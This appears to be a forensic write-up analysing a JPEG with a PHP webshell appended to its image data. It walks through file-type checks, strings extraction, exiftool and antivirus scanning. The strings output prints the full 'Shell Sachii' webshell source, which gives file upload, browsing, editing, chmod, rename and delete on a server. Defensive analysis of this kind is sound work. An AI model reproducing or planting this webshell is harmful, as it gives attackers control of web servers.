# The forensic step i performed

## 1. file type verification
use the filename.jpg command to confirm whether it's a JPEG. If it outputs "JPEG image data" but the file size is unusual, be suspicious.
Even though the output said “JPEG image data, JFIF standard…”, the file was perfectly valid and opened normally in any image viewer.
```bash
1551.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1061x1061, components 3
```

This is exactly why attackers love JPEG they pass every basic validation:
Website upload systems
PHP functions like getimagesize() or exif_read_data()
Many antivirus engines that only check the header

## 2. Extract Printable Strings:
Execute the string file_name.jpg to retrieve printable characters. In my case, it resulted in <?php and the complete webshell code indicating a backdoor.
The beginning looked completely normal (JFIF headers, Huffman tables, compressed entropy data just regular JPEG “noise”). But scrolling to the very end revealed a full PHP webshell starting with
```bash
JFIF
!1!%)+...
383-7(-.+
--------------------------------------------------
6\l.@
OsQ{
DLB&_
!ZIF
=ENZ
+F:B
MLN"W
S2Wq
orKV
z5{:
J2WL
U%%/T
J       9UV{
v61T
zMgOy
\\SMZI
-oMs=tLZ7
Vk;w
oR`~
VQJ)rKD
5bp8
eyZ\]
[ROz
-<<a_
u+w}
zPw[
n_EQ<
nb4P_
QdH%
1(~q
3W-"
s&;gR
;t"4
o*qu
kxw}
8Z8J7t
o13VUlixNq
tG[Li$
`((S
qR)X
q5i:rq
8IIoO
lv#$%.;
2&WK
':/_
onv|Z
#arB
x2|5
cO'\
r=4x
Nn/zv<
Y"aX
YA(U
[#mP
;[kX
J       .B
?LsW/5
fb[]
CDkc
-YnVY3=
N<<|
qXiZw;{M
SZ|W
RZ9+
r|-Xcf
m"UliID
t+GsO4:
Y'$G
J-]4
aP+"E\
hp}m
kG*_D
Ya{9
0O'7l
=2j5
ZVO,f
.%mH
`A:6
)JO{
d$      H6
J:f]
MDvd
9JYjF*Q
TQoIw~z
f'IB|
YjE8
O6U)%
fX<;
s-qZ
E,T%
RIE$
MNE|
pX*t
N*1[
mM>M?c
T%M_Z
yogg7V
<U)l
<S]v
Xx*zSUq2
uGj4
YYYnH
<.*/
Z">T
<//d
~M3K
ymir
3/?%
'-svj
g9W4'
S#K@
?$%/T
X[9J
t0_N
fR1iD
+Nx5
Kkn"aX
)q{kf
/")O
6IF)F1IF1IF)nI-
n'mt~q
XfZIi(
N]98
wK%r
]B5
4iIH
A) J
#*'r
jWOn
mnZ/.g
jjVK
L{Vkh
        @BR
FOY?M
kV=/
;yu=
+~Yi
J{E[
E&Tx
[>I}
/?=JM
eQKq
j6UH
GBQ\
VWkm
L"'O*
'i,F
"o+K{N
=7v;,)
,cA;V
)H!(
]+if
cedb
VeIR2
b7/^
(IJ;
N;D)
Eu]1
gF%VH
b,61
4LJQ`
;}/<
z6zJ
rk-|
?l,ae
t\"W
YU$
!$#`B
BHHJP
VK{vE
]~Yw
)m:;
oDL*
>V;R
iZY[n/r
9;]?m
X{imj9
3Zk0
9}Cv
2B%fQ6Y"
"!ed
]N%X
)9eI
G{R\
|]'^
Q=5i
Va1/<
y+Q5
B`l2)$d
&VD"O
/L"^!I
4mGM
NKwK
{hS=
%l1Y
bh3W.(
Z%'+Zd
+X'l
7Vzd
<`[J
C%ri
2^wF
J[$C
Vff^
%;`x
c{:?
<?php
error_reporting(0);
set_time_limit(0);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>Shell Sachii Exploit</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: black;
color:white;
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px red;
#content .first{
background-color: red;
table{
border: 1px red dotted;
color:white;
text-decoration: none;
a:hover{
color:blue;
text-shadow:0px 0px 10px red;
input,select,textarea{
border: 1px red solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
</style>
</head>
<body>
<h1><center>
<img src="https://fsa.zobj.net/crop.php?r=xQOJwLfwAHyAqbiVGCCAm3mZWGU-k7XhMCtxHQz5nXyNJndsiXpawMnazwJdCpSBj9juEWlliu6V5YhxI7FsUxS8vd_NrrBSx1yQtsVZId2Xmf5PsWGUxb37W_h-_MbHk3PmRoItC-GVV7pD" height="400" width="500">
<br>
<font color="red">Shell Sachii V.20</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
echo '">'.$pat.'</a>/';
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Berjaya Upload</font><br />';
}else{
echo '<font color="red">Faild Upload</font><br/>';
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">Jom Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Berjaya</font><br/>';
}else{
echo '<font color="red">Change Permission Faild</font><br />';
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Berjaya Ganti Nama</font><br/>';
}else{
echo '<font color="red">Faild Ganti Nama</font><br />';
$_POST['name'] = $_POST['newname'];
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Berjaya Edit File</font><br/>';
}else{
echo '<font color="red">Faild Edit File</font><br/>';
fclose($fp);
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Faild Delete                                                                                                                                                                                                                                                                                             </font><br/>';
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">File Berjaya</font><br/>';
}else{
echo '<font color="red">File Faild File</font><br/>';
echo '</center>';
if(function_exists('opendir')) {
        if($opendir = opendir($path)) {
                while(($readdir = readdir($opendir)) !== false) {
                        $scandir[] = $readdir;
                closedir($opendir);
        sort($scandir);
} else {
        $scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="blue">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="ubah nama">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="blue">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Ubah Nama</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
echo '</table>
</div>';
echo '<center><br/> Copyright Shell Sachii 2020. </center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
```

This is a JPEG signature file (JFIF header). This means it's not a regular PHP file, but rather a JPEG image file embedded in a webshell.

## 3. Metadata Inspection:

Use exiftool file_name.jpg to check the EXIF. Look for anomalies such as long comments or embedded code.
```bash
 exiftool sk_011023081918_cusu.jpg
```
```bash
ExifTool Version Number         : 13.36
File Name                       : sk_011023081918_cusu.jpg
Directory                       : .
File Size                       : 26 kB
File Modification Date/Time     : 2023:10:01 20:19:12+07:00
File Access Date/Time           : 2025:12:11 09:19:40+07:00
File Inode Change Date/Time     : 2025:12:06 18:26:27+07:00
File Permissions                : -rwxrwx---
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 554
Image Height                    : 554
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 554x554
Megapixels                      : 0.307
```
almost completely empty. No camera info, no GPS, no software tag, no comments. Red flag! A legitimate photo taken with a phone or camera almost always has EXIF data

## 4.Malware Scan
Upload to VirusTotal or use ClamAV for webshell signature detection.

<img width="1918" height="928" alt="Screenshot 2025-12-09 191439" src="https://github.com/user-attachments/assets/4486a3da-5c3c-4df0-ab0d-2e5685b596dd" />

detected by several engines as PHP/Webshell, Trojan.Backdoor, or Malicious.Loader. ClamAV locally also flagged it.


